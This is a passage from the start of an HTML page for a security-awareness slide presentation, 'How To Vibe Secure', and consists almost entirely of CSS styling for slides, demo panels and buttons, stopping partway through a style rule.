<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>How To Vibe Secure ‚Äî One‚ÄëPage App</title>
    <meta name="description" content="A single-page, scrollable presentation with interactive security demos." />
    <meta name="theme-color" content="#0f172a" />
    <link rel="preload" href="styles/main.css" as="style" />
    <style>
/* Clean, projection-optimized design */
:root {
  /* Light theme with cohesive pastel palette for projection */
  --bg: #ffffff; 
  --bg-elev: #f8fafc; 
  --bg-card: #f1f5f9;
  --text: #0f172a; 
  --text-dim: #475569; 
  --text-muted: #64748b;
  
  /* Cohesive pastel palette */
  --pastel-blue: #93c5fd;
  --pastel-indigo: #a5b4fc;
  --pastel-violet: #c4b5fd;
  --pastel-teal: #5eead4;
  --pastel-green: #86efac;
  --pastel-orange: #fdba74;
  --pastel-red: #fca5a5;
  
  /* Primary accent colors for interactive elements */
  --accent-primary: #3b82f6;
  --accent-secondary: #8b5cf6;
  --accent-success: #10b981;
  --accent-warning: #f59e0b;
  --accent-danger: #ef4444;
  
  /* Default accent (will be overridden per slide) */
  --accent: var(--accent-primary); 
  --accent-dim: #2563eb;
  --accent-rgb: 59, 130, 246;
  
  --border: #e2e8f0; 
  --subtle: #f1f5f9;
  --shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
}

* { box-sizing: border-box; }
html, body { height: 100%; }
html {
  scroll-behavior: smooth;
  overscroll-behavior-y: none;
  background: var(--bg);
}
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', system-ui, sans-serif;
  color: var(--text);
  background: var(--bg);
  -webkit-font-smoothing: antialiased;
  text-rendering: optimizeLegibility;
  height: 100vh;
  overflow: hidden;
  font-weight: 400;
  line-height: 1.4;
}

/* Timeline removed for cleaner look */

/* Slides */
.content, #content { position: fixed; inset: 0; overflow-y: auto; scroll-snap-type: y mandatory; scroll-behavior: smooth; overscroll-behavior-y: contain; }

/* Temporarily disable scroll-snap during viewport changes */
.content.no-snap, #content.no-snap { 
  scroll-snap-type: none !important; 
  scroll-behavior: auto !important;
}
.slide {
  height: 100vh;
  padding: clamp(1.5rem, 3vw, 2rem);
  display: grid;
  align-content: center;
  gap: 1rem;
  border-bottom: 1px solid var(--border);
  scroll-snap-align: start;
  scroll-snap-stop: always;
  background: var(--bg);
  position: relative;
  overflow-y: auto;
  box-sizing: border-box;
}

/* When content overflows, align to start instead of center */
.slide.overflow-content {
  align-content: start;
}

/* Presentation mode scaling for content that's too tall */
.slide.scale-content {
  transform-origin: center top;
  transform: scale(0.92);
  padding-top: clamp(1rem, 2vw, 1.5rem);
}

/* Ensure minimum readable sizes */
.slide.scale-content h2 {
  font-size: clamp(1.3rem, 2.2vw, 1.9rem);
}
.slide.scale-content p,
.slide.scale-content li {
  font-size: clamp(0.9rem, 1.7vw, 1rem);
}

/* Clean, readable typography with improved contrast */
.slide h1 { 
  font-size: clamp(2.2rem, 4vw, 3.2rem); 
  margin: 0 0 0.5rem 0; 
  font-weight: 700;
  color: var(--text);
  letter-spacing: -0.01em;
  position: relative;
  padding-bottom: 0.75rem;
}
.slide h1::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 60px;
  height: 3px;
  background: linear-gradient(90deg, var(--accent), var(--accent-pastel));
  border-radius: 2px;
}
.slide h2 { 
  font-size: clamp(1.4rem, 2.2vw, 2rem); 
  margin: 0 0 0.75rem 0; 
  font-weight: 600;
  color: var(--text);
  letter-spacing: -0.01em;
  position: relative;
  padding-bottom: 0.4rem;
}
.slide h2::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 40px;
  height: 2px;
  background: var(--accent);
  border-radius: 1px;
}
.slide p, .slide li { 
  line-height: 1.4; 
  font-size: clamp(0.95rem, 1.8vw, 1.05rem); 
  margin: 0.5rem 0;
}
.lead { 
  margin: 0 0 1rem 0; 
  font-size: clamp(1.05rem, 2.2vw, 1.2rem); 
  font-weight: 500;
  line-height: 1.4;
}
.hint { 
  color: var(--text-dim); 
  font-size: clamp(0.9rem, 1.8vw, 1rem); 
  line-height: 1.4;
}
.muted {
  color: var(--text-muted);
}
/* Improved spacing system - more compact */
.slide {
  padding: clamp(1.5rem, 3vw, 2rem);
  gap: 1rem;
}

.demo { 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  border-radius: 12px; 
  padding: 1.5rem; 
  box-shadow: var(--shadow);
  position: relative;
  overflow: hidden;
}
.demo::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 2px;
  background: linear-gradient(90deg, var(--accent) 0%, var(--accent-dim) 100%);
}
.notes { color: var(--text-dim); }
.notes summary { cursor: pointer; }

/* Basics with improved readability */
code, pre { 
  font-family: 'JetBrains Mono', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; 
  font-size: clamp(0.85rem, 1.8vw, 0.95rem);
}
pre { 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  padding: 1.25rem; 
  border-radius: 8px; 
  overflow: auto;
  box-shadow: var(--shadow);
  line-height: 1.4;
  margin: 1rem 0;
}
code {
  background: rgba(var(--accent-rgb), 0.1);
  color: var(--accent-dim);
  padding: 0.25rem 0.5rem;
  border-radius: 4px;
  font-size: clamp(0.8rem, 1.6vw, 0.9rem);
  font-weight: 500;
  border: 1px solid rgba(var(--accent-rgb), 0.2);
}
a { 
  color: var(--accent); 
  text-decoration: none;
  transition: all 0.2s ease;
}
a:hover {
  color: var(--accent-dim);
  text-shadow: var(--glow);
}

/* Enhanced styling for security presentation */

/* Slide indicator - positioned at bottom-left */
.slide-indicator {
  position: fixed;
  bottom: 20px;
  left: 20px;
  background: var(--accent);
  color: white;
  padding: 0.75rem 1rem;
  border-radius: 24px;
  font-weight: 600;
  font-size: 0.85rem;
  z-index: 50;
  box-shadow: 0 8px 24px rgba(0,0,0,0.15);
  opacity: 0.9;
  transition: all 200ms ease;
  cursor: pointer;
  min-width: 80px;
  text-align: center;
}

.slide-indicator:hover {
  opacity: 1;
  transform: translateY(-2px);
  box-shadow: 0 12px 32px rgba(0,0,0,0.2);
}

/* Table of Contents - only triggered by slide indicator hover */
.table-of-contents {
  position: fixed;
  left: 0;
  top: 0;
  bottom: 0;
  width: 320px;
  background: color-mix(in oklab, var(--bg-elev), black 5%);
  backdrop-filter: blur(20px);
  border-right: 1px solid var(--border);
  z-index: 40;
  opacity: 0;
  pointer-events: none;
  transform: translateX(-100%);
  transition: all 250ms ease;
  overflow-y: auto;
}

/* Show TOC when slide indicator is hovered (controlled by JS) */
.table-of-contents.show {
  opacity: 1;
  pointer-events: auto;
  transform: translateX(0);
}

.toc-header {
  padding: 1.5rem 1.5rem 1rem 1.5rem;
  font-weight: 600;
  font-size: 1.1rem;
  color: var(--text);
  border-bottom: 1px solid var(--border);
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 5%);
}

.toc-content {
  padding: 0.5rem 0;
}

.toc-item {
  display: flex;
  align-items: center;
  gap: 1rem;
  padding: 0.75rem 1.5rem;
  cursor: pointer;
  transition: all 150ms ease;
  border-left: 3px solid transparent;
}

.toc-item:hover {
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-left-color: var(--accent);
}

.toc-item.active {
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 12%);
  border-left-color: var(--accent);
  font-weight: 600;
}

.toc-number {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 24px;
  height: 24px;
  border-radius: 50%;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 15%);
  color: var(--accent);
  font-size: 0.8rem;
  font-weight: 600;
  flex-shrink: 0;
}

.toc-item.active .toc-number {
  background: var(--accent);
  color: white;
}

.toc-title {
  font-size: 0.9rem;
  line-height: 1.3;
  color: var(--text);
}

.toc-item.active .toc-title {
  color: var(--accent);
}

/* Small screens */
@media (max-width: 700px) { 
  .table-of-contents {
    width: 280px;
  }
}

/* Per-slide cohesive pastel palette - harmonized colors */
.slide { 
  --accent: var(--accent-primary); 
  --accent-dim: #2563eb;
  --accent-rgb: 59, 130, 246;
  --accent-pastel: var(--pastel-blue);
}
.slide[data-color="blue"] { 
  --accent: var(--accent-primary); 
  --accent-dim: #2563eb;
  --accent-rgb: 59, 130, 246;
  --accent-pastel: var(--pastel-blue);
}
.slide[data-color="indigo"] { 
  --accent: #6366f1; 
  --accent-dim: #4f46e5;
  --accent-rgb: 99, 102, 241;
  --accent-pastel: var(--pastel-indigo);
}
.slide[data-color="violet"] { 
  --accent: var(--accent-secondary); 
  --accent-dim: #7c3aed;
  --accent-rgb: 139, 92, 246;
  --accent-pastel: var(--pastel-violet);
}
.slide[data-color="teal"] { 
  --accent: #14b8a6; 
  --accent-dim: #0f766e;
  --accent-rgb: 20, 184, 166;
  --accent-pastel: var(--pastel-teal);
}
.slide[data-color="green"] { 
  --accent: var(--accent-success); 
  --accent-dim: #059669;
  --accent-rgb: 16, 185, 129;
  --accent-pastel: var(--pastel-green);
}
.slide[data-color="orange"] { 
  --accent: var(--accent-warning); 
  --accent-dim: #d97706;
  --accent-rgb: 245, 158, 11;
  --accent-pastel: var(--pastel-orange);
}
.slide[data-color="red"] { 
  --accent: var(--accent-danger); 
  --accent-dim: #dc2626;
  --accent-rgb: 239, 68, 68;
  --accent-pastel: var(--pastel-red);
}

/* Slide-specific styling */

/* Intro slide specific */
.subtitle { 
  font-size: 1.2rem; 
  font-weight: 600; 
  color: var(--muted); 
  margin: 0.5rem 0 1.5rem 0; 
}
.about-author { 
  margin-top: 1.5rem; 
  padding: 1rem; 
  background: var(--subtle); 
  border-radius: 6px; 
  border: 1px solid var(--border);
}
.about-author a { 
  color: var(--accent); 
  text-decoration: none; 
  font-weight: 600; 
}
.about-author a:hover { 
  text-decoration: underline; 
}
.author-background { 
  margin-top: 1rem; 
}
.author-background p { 
  margin: 0.5rem 0; 
  color: var(--muted); 
  font-size: 0.9rem; 
}

/* Clean, compact mindset slide - no generic cards */
.lead-question { 
  margin: 0 0 1.5rem 0; 
  text-align: center;
}
.lead-question h3 { 
  margin-bottom: 0.75rem; 
  color: var(--text-dim); 
  font-size: 1rem; 
  font-weight: 500;
}
.big-question { 
  font-size: clamp(1.3rem, 2.5vw, 1.8rem); 
  font-weight: 700; 
  color: var(--bg); 
  padding: 1rem 1.5rem; 
  background: var(--accent);
  border-radius: 6px;
  margin: 0; 
  text-align: center;
  box-shadow: var(--shadow);
}

/* Compact section with tight spacing */
.one-prompt-away { 
  margin: 1.5rem 0 1rem 0; 
}
.one-prompt-away h3 { 
  margin: 0 0 0.75rem 0; 
  color: var(--text); 
  font-size: 1.1rem;
  font-weight: 600;
}

/* Inline list instead of cards */
.ai-prompts { 
  margin: 0;
  padding: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}
.ai-prompts li { 
  margin: 0; 
  padding: 0.5rem 0;
  font-size: 0.95rem;
  line-height: 1.3;
  position: relative;
  padding-left: 1.5rem;
}
.ai-prompts li::before {
  content: '‚Üí';
  position: absolute;
  left: 0;
  color: var(--accent);
  font-weight: 600;
}

/* Tight questions section */
.adversarial-questions { 
  margin: 1.5rem 0 0 0; 
}
.adversarial-questions h3 { 
  color: var(--text); 
  margin: 0 0 0.75rem 0; 
  font-size: 1.1rem;
  font-weight: 600;
}

/* Two-column compact list instead of grid cards */
.question-list { 
  margin: 0; 
  padding: 0; 
  list-style: none;
  display: grid;
  grid-template-columns: 1fr 1fr;
  column-gap: 1rem;
  row-gap: 0.75rem;
  font-size: 0.9rem;
}
.question-list li { 
  margin: 0; 
  padding: 0.25rem 0;
  position: relative;
  padding-left: 1.2rem;
  line-height: 1.3;
}
.question-list li::before {
  content: '‚Ä¢';
  position: absolute;
  left: 0;
  color: var(--accent);
  font-weight: 600;
}

@media (max-width: 768px) {
  .question-list {
    grid-template-columns: 1fr;
    gap: 0.5rem;
  }
}

/* Frontend vs Backend comparison */
.comparison { 
  display: grid; 
  grid-template-columns: 1fr 1fr; 
  gap: 1.5rem; 
  margin: 1rem 0; 
}
.frontend-side, .backend-side { 
  padding: 1rem; 
  border-radius: 0.5rem; 
}
.frontend-side { 
  background: color-mix(in oklab, var(--bg-elev), #ef4444 8%); 
  border-left: 3px solid #ef4444; 
}
.backend-side { 
  background: color-mix(in oklab, var(--bg-elev), #22c55e 8%); 
  border-left: 3px solid #22c55e; 
}

/* AI prompt styling */
.context-first {
  margin-bottom: 2rem;
  padding: 1.5rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-radius: 0.5rem;
  border-left: 4px solid var(--accent);
}
.context-first h3 {
  margin-bottom: 0.5rem;
  color: var(--accent);
}
.context-first p {
  margin-bottom: 1rem;
  color: var(--muted);
}
.example-context {
  padding: 1rem;
  background: var(--bg);
  border-radius: 0.4rem;
  border: 1px solid var(--border);
  font-style: italic;
  color: var(--text-dim);
}

.prompt-template, .assistant-brief { 
  margin: 1rem 0; 
}
.security-criteria { 
  background: var(--bg-elev); 
  padding: 1.5rem; 
  border-radius: 0.5rem; 
  border: 1px solid var(--border); 
}
.security-criteria li { 
  margin: 0.75rem 0; 
  padding-left: 0.5rem;
}
.one-liner { 
  margin-top: 1.5rem; 
  padding: 1rem; 
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%); 
  border-radius: 0.5rem; 
  text-align: center; 
  border: 2px dashed var(--accent); 
}

.prompt-box { 
  background: var(--bg-card); 
  color: var(--text); 
  padding: 1rem; 
  border-radius: 6px; 
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; 
  font-size: 0.9rem; 
  border: 1px solid var(--border); 
  margin: 0.75rem 0;
}
.prompt-box p { 
  margin: 0; 
  line-height: 1.4; 
}

/* Mental model highlighting */
.mental-model { 
  margin: 1rem 0; 
  padding: 1rem; 
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 5%); 
  border-radius: 0.5rem; 
}
.highlight { 
  background: var(--accent-weak); 
  padding: 0.2rem 0.4rem; 
  border-radius: 0.25rem; 
  font-weight: 600; 
}

/* Verification sections */
.verify-section { 
  margin: 1rem 0; 
}
.checklist { 
  list-style: none; 
  padding: 0; 
}
.checklist li { 
  padding: 0.25rem 0; 
}

/* Secrets slide - maximum compact layout with env vars info */
#secrets .assistant-brief {
  margin: 0.2rem 0;
}
#secrets .env-vars-info {
  margin: 0.3rem 0;
  padding: 0.4rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-radius: 0.4rem;
  border-left: 3px solid var(--accent);
}
#secrets .env-vars-info h3 {
  margin: 0 0 0.3rem 0;
  color: var(--accent);
  font-size: 0.95rem;
}
#secrets .env-vars-info p {
  margin: 0;
  font-size: 0.85rem;
  line-height: 1.3;
}
#secrets .verify-section {
  margin: 0.3rem 0;
}
#secrets .demo {
  margin-top: 0.4rem;
  padding: 0.5rem;
}
#secrets .demo h4 {
  margin-bottom: 0.15rem;
  font-size: 0.95rem;
}
#secrets .demo p {
  margin: 0.15rem 0;
  font-size: 0.8rem;
}
#secrets h3 {
  margin-bottom: 0.3rem;
  font-size: 1rem;
}
#secrets .checklist {
  margin: 0.3rem 0;
}
#secrets .checklist li {
  padding: 0.1rem 0;
  font-size: 0.9rem;
}

/* RLS slide - two-column layout */
#rls .rls-layout {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  align-items: start;
  height: 100%;
}

#rls .rls-content {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

#rls .what-is-rls {
  margin: 1rem 0;
  padding: 1rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 5%);
  border-radius: 0.5rem;
  border-left: 4px solid var(--accent);
}

#rls .what-is-rls h3 {
  margin: 0 0 0.5rem 0;
  color: var(--accent);
  font-size: 1.1rem;
}

#rls .what-is-rls p {
  margin: 0;
  line-height: 1.4;
}


#rls .rls-demo {
  position: sticky;
  top: 2rem;
}

#rls .rls-demo .demo {
  padding: 1rem;
  margin: 0;
}

#rls .demo-controls {
  display: flex;
  gap: 0.5rem;
  margin-top: 1rem;
  justify-content: space-between;
}

#rls .policy-btn, #rls .reset-btn {
  padding: 0.5rem 1rem;
  font-size: 0.85rem;
  border-radius: 0.375rem;
  border: 1px solid var(--border);
  background: var(--bg-elev);
  color: var(--text);
  cursor: pointer;
  transition: all 0.2s ease;
}

#rls .policy-btn:hover, #rls .reset-btn:hover {
  background: var(--accent);
  color: white;
  border-color: var(--accent);
}

#rls .policy-code {
  margin-top: 1rem;
  padding: 1rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 0.5rem;
  border-left: 4px solid var(--accent);
}

#rls .policy-code h5 {
  margin: 0 0 0.5rem 0;
  color: var(--accent);
  font-size: 0.9rem;
}

#rls .policy-code code {
  display: block;
  font-family: var(--font-mono);
  font-size: 0.8rem;
  color: var(--text);
  line-height: 1.4;
  white-space: pre-wrap;
}

/* Responsive adjustments for RLS */
@media (max-width: 1024px) {
  #rls .rls-layout {
    grid-template-columns: 1fr;
    gap: 1rem;
  }
  
  #rls .rls-demo {
    position: static;
  }
}

/* What NOT to do styling */
.what-not-to-do { 
  margin: 1rem 0; 
}
.dont-list { 
  background: color-mix(in oklab, var(--bg-elev), #ef4444 8%); 
  padding: 1rem 1.25rem; 
  border-radius: 0.5rem; 
  border-left: 3px solid #ef4444; 
}
.dont-list li { 
  margin: 0.75rem 0; 
  padding-left: 0.25rem;
}
.dont-list code { 
  background: rgba(239, 68, 68, 0.1); 
}

/* Security headers guide styling */
.security-headers-guide {
  margin: 1rem 0;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  padding: 1rem 1.25rem;
  border-radius: 0.5rem;
  border-left: 3px solid var(--accent);
}
.security-headers-guide ul {
  margin: 0.5rem 0;
}
.security-headers-guide li {
  margin: 0.75rem 0;
  padding-left: 0.25rem;
}
.security-headers-guide strong {
  color: var(--accent);
}

/* Storage rules */
.storage-rules, .key-rules, .key-concepts { 
  margin: 1rem 0; 
}

/* Enhanced vulnerability cards with consistent styling */
.vuln-grid { 
  display: grid; 
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
  gap: 1.25rem; 
  margin: 0.75rem 0; 
}
.vuln-card { 
  padding: 1rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 8px;
  border-left: 4px solid var(--accent-pastel);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  transition: all 0.2s ease;
}
.vuln-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
  border-left-color: var(--accent);
}
.vuln-card h4 { 
  margin: 0 0 0.75rem 0; 
  color: var(--accent); 
  font-weight: 600;
  font-size: 1.1rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}
.vuln-card h4::before {
  content: '‚ö†Ô∏è';
  font-size: 1rem;
}
.vuln-card p { 
  margin: 0.5rem 0; 
  font-size: 0.9rem; 
  line-height: 1.4;
}
.vuln-card p:first-of-type {
  color: var(--text-dim);
  font-weight: 500;
}
.vuln-card p:last-of-type {
  color: var(--accent-danger);
  font-weight: 600;
  background: rgba(239, 68, 68, 0.1);
  padding: 0.5rem;
  border-radius: 4px;
  margin-top: 0.75rem;
}
.vuln-card p:last-of-type::before {
  content: 'üö® ';
  margin-right: 0.25rem;
}

/* Enhanced testing steps with card styling */
.testing-steps { 
  display: grid; 
  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); 
  gap: 1.25rem; 
  margin: 0.75rem 0; 
}
.step { 
  padding: 1rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 8px;
  border-left: 4px solid var(--accent-pastel);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  transition: all 0.2s ease;
}
.step:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
  border-left-color: var(--accent);
}
.step h3 { 
  margin: 0 0 0.75rem 0; 
  color: var(--accent); 
  font-weight: 600;
  font-size: 1.1rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}
.step h3::before {
  content: counter(step-counter);
  counter-increment: step-counter;
  background: var(--accent);
  color: white;
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.8rem;
  font-weight: 700;
}
.testing-steps {
  counter-reset: step-counter;
}
.step p {
  margin: 0;
  line-height: 1.4;
  color: var(--text-dim);
}

/* Enhanced checklist with card styling */
.checklist-grid { 
  display: grid; 
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); 
  gap: 0.8rem; 
  margin: 0.75rem 0; 
}
.checklist-item { 
  display: flex; 
  align-items: flex-start; 
  gap: 0.8rem; 
  padding: 0.8rem; 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  border-radius: 6px;
  border-left: 3px solid var(--accent-pastel);
  cursor: pointer; 
  transition: all 0.2s ease;
  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
}
.checklist-item:hover { 
  transform: translateY(-1px);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  border-left-color: var(--accent);
}
.checklist-item input[type="checkbox"] { 
  margin: 0.2rem 0 0 0; 
  flex-shrink: 0;
  transform: scale(1.2);
  accent-color: var(--accent);
}
.checklist-item span { 
  line-height: 1.4; 
  font-size: 0.95rem;
  color: var(--text);
}
.checklist-item span strong {
  color: var(--accent);
  font-weight: 600;
}

/* Resources styling */
.resources-grid { 
  display: grid; 
  grid-template-columns: 1fr 1fr; 
  gap: 2rem; 
  margin: 1rem 0; 
}
.resource-section h3 { 
  color: var(--accent); 
  margin-top: 0; 
}
.prompt-examples { 
  margin-top: 1rem; 
}
.prompt-example { 
  margin: 1rem 0; 
  padding: 1rem; 
  background: var(--bg-elev); 
  border-radius: 0.5rem; 
  border-left: 3px solid var(--accent); 
}
.prompt-example strong { 
  color: var(--accent); 
}
.prompt-example code { 
  display: block; 
  margin-top: 0.5rem; 
  padding: 0.5rem; 
  background: rgba(0,0,0,0.05); 
  border-radius: 0.25rem; 
  font-size: 0.85rem; 
  line-height: 1.3; 
}

.footnote { 
  text-align: center; 
  margin-top: 2rem; 
  color: var(--muted); 
  font-style: italic; 
}
/* Demo-specific styling */

/* XSS Demo pulse animation */
@keyframes pulse {
  0% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.02); opacity: 0.8; }
  100% { transform: scale(1); opacity: 1; }
}

/* Enhanced demo components with consistent card styling */
.demo { 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  border-radius: 8px; 
  padding: 1.25rem; 
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  position: relative;
  overflow: hidden;
  border-left: 4px solid var(--accent-pastel);
  transition: all 0.2s ease;
}
.demo:hover {
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
  border-left-color: var(--accent);
}
.demo::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 1px;
  background: var(--accent);
}
.demo h4 { 
  margin: 0 0 0.75rem 0; 
  color: var(--accent); 
  font-weight: 600;
  font-size: 1.05rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
  padding-bottom: 0.4rem;
  border-bottom: 1px solid var(--border);
}
.demo h4::before {
  content: 'üîß';
  font-size: 1.1rem;
}

.demo-controls { 
  display: flex; 
  flex-direction: column; 
  gap: 1rem; 
}

/* Unified button styling with consistent design */
button, .demo button, .user-tab, .sample-buttons button, .test-actions button, .limit-controls button {
  background: var(--accent);
  color: white;
  border: 1px solid var(--accent);
  border-radius: 6px;
  padding: 0.75rem 1.25rem;
  font-weight: 600;
  font-size: 0.9rem;
  font-family: inherit;
  cursor: pointer;
  transition: all 0.2s ease;
  box-shadow: 0 2px 8px rgba(var(--accent-rgb), 0.2);
  position: relative;
  min-width: 44px; /* Accessibility: minimum touch target */
  min-height: 44px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
}

button:hover, .demo button:hover, .user-tab:hover, .sample-buttons button:hover, .test-actions button:hover, .limit-controls button:hover {
  background: var(--accent-dim);
  border-color: var(--accent-dim);
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(var(--accent-rgb), 0.3);
}

button:active, .demo button:active, .user-tab:active, .sample-buttons button:active, .test-actions button:active, .limit-controls button:active {
  transform: translateY(0);
  box-shadow: 0 1px 4px rgba(var(--accent-rgb), 0.2);
}

/* Button variants with semantic meaning */
.danger-btn {
  background: var(--accent-danger) !important;
  border-color: var(--accent-danger) !important;
  box-shadow: 0 2px 8px rgba(239, 68, 68, 0.2) !important;
}
.danger-btn:hover {
  background: #dc2626 !important;
  border-color: #dc2626 !important;
  box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3) !important;
}
.danger-btn::before {
  content: '‚ö†Ô∏è ';
}

.safe-btn {
  background: var(--accent-success) !important;
  border-color: var(--accent-success) !important;
  box-shadow: 0 2px 8px rgba(16, 185, 129, 0.2) !important;
}
.safe-btn:hover {
  background: #059669 !important;
  border-color: #059669 !important;
  box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3) !important;
}
.safe-btn::before {
  content: '‚úì ';
}

.warning-btn {
  background: var(--accent-warning) !important;
  border-color: var(--accent-warning) !important;
  box-shadow: 0 2px 8px rgba(245, 158, 11, 0.2) !important;
}
.warning-btn:hover {
  background: #d97706 !important;
  border-color: #d97706 !important;
  box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3) !important;
}

/* Secondary button style */
.secondary-btn {
  background: var(--bg) !important;
  color: var(--accent) !important;
  border-color: var(--accent) !important;
  box-shadow: 0 1px 4px rgba(var(--accent-rgb), 0.1) !important;
}
.secondary-btn:hover {
  background: var(--accent) !important;
  color: white !important;
}

button:disabled {
  background: var(--border) !important;
  color: var(--text-dim) !important;
  border-color: var(--border) !important;
  cursor: not-allowed !important;
  transform: none !important;
  box-shadow: none !important;
  opacity: 0.6;
}
.demo-status { 
  margin: 0.75rem 0 0 0; 
  padding: 0.6rem; 
  background: var(--bg-elev); 
  border-radius: 6px; 
  border: 1px solid var(--border); 
  font-family: ui-monospace, monospace;
  font-size: 0.85rem;
  min-height: 2rem;
  display: flex;
  align-items: center;
}
.demo-instructions { 
  margin-top: 0.75rem; 
  padding: 0.75rem; 
  background: rgba(var(--accent-rgb), 0.05); 
  border: 1px solid rgba(var(--accent-rgb), 0.1);
  border-radius: 6px; 
  font-size: 0.85rem;
  border-left: 3px solid var(--accent-pastel);
}
.demo-instructions::before {
  content: 'üìù ';
  font-weight: 600;
  color: var(--accent);
}

/* User tabs for RLS demo */
.user-tabs { 
  display: flex; 
  gap: 0.5rem; 
  margin-bottom: 1rem; 
}
.user-tab { 
  padding: 0.5rem 1rem; 
  font-size: 0.9rem;
}
.user-tab:not(.active) {
  background: var(--bg-elev) !important;
  color: var(--accent) !important;
  border-color: var(--border) !important;
  box-shadow: none !important;
}
.user-tab.active { 
  background: var(--accent) !important;
  color: white !important;
  border-color: var(--accent) !important;
}

.test-actions { 
  display: flex; 
  gap: 0.5rem; 
  flex-wrap: wrap; 
  margin-bottom: 1rem; 
}
.test-actions button { 
  padding: 0.5rem 1rem; 
  font-size: 0.85rem;
}

/* Results styling */
.rls-results, .scan-results, .validation-results, .request-log, .headers-output, .ssrf-results, .test-output, .access-results { 
  margin-top: 1rem; 
  min-height: 3rem; 
  padding: 1rem; 
  background: var(--bg-elev); 
  border: 1px solid var(--border); 
  border-radius: 0.5rem; 
}

/* RLS Demo specific styles */
.data-creation {
  margin-bottom: 1rem;
}

.create-controls {
  display: flex;
  gap: 0.5rem;
  align-items: center;
  flex-wrap: wrap;
}

.create-controls select, .create-controls input {
  padding: 0.5rem;
  border: 1px solid var(--border);
  border-radius: 0.375rem;
  background: var(--bg-main);
  color: var(--text-primary);
  font-size: 0.9rem;
}

.create-controls input {
  flex: 1;
  min-width: 200px;
}

.database-table, .query-results {
  margin: 1rem 0;
}

.database-table h5, .query-results h5 {
  margin: 0 0 0.5rem 0;
  color: var(--text-primary);
  font-weight: 600;
  font-size: 0.9rem;
}

#databaseTable, #resultsTable {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.8rem;
  background: var(--bg-main);
  border: 1px solid var(--border);
  border-radius: 0.375rem;
  overflow: hidden;
}

#databaseTable th, #databaseTable td,
#resultsTable th, #resultsTable td {
  padding: 0.5rem;
  text-align: left;
  border-bottom: 1px solid var(--border);
}

#databaseTable th, #resultsTable th {
  background: var(--bg-elev);
  font-weight: 600;
  color: var(--text-primary);
  font-size: 0.75rem;
}

#databaseTable td, #resultsTable td {
  font-family: var(--font-mono);
  font-size: 0.75rem;
}

.query-controls {
  margin: 1rem 0;
  padding: 1rem;
  background: var(--bg-elev);
  border: 1px solid var(--border);
  border-radius: 0.5rem;
}

.query-settings {
  display: flex;
  gap: 1rem;
  align-items: center;
  flex-wrap: wrap;
  margin-bottom: 1rem;
}

.current-user, .rls-toggle {
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.query-settings select {
  padding: 0.4rem;
  border: 1px solid var(--border);
  border-radius: 0.375rem;
  background: var(--bg-main);
  color: var(--text-primary);
  font-size: 0.85rem;
}

.rls-toggle label {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  font-size: 0.9rem;
  cursor: pointer;
}

.query-btn {
  background: var(--accent);
  color: white;
  border: none;
  padding: 0.6rem 1rem;
  border-radius: 0.375rem;
  font-family: var(--font-mono);
  font-size: 0.85rem;
  cursor: pointer;
}

.sql-display {
  margin: 0.5rem 0;
  padding: 0.75rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 0.375rem;
  border-left: 4px solid var(--accent);
}

.sql-display code {
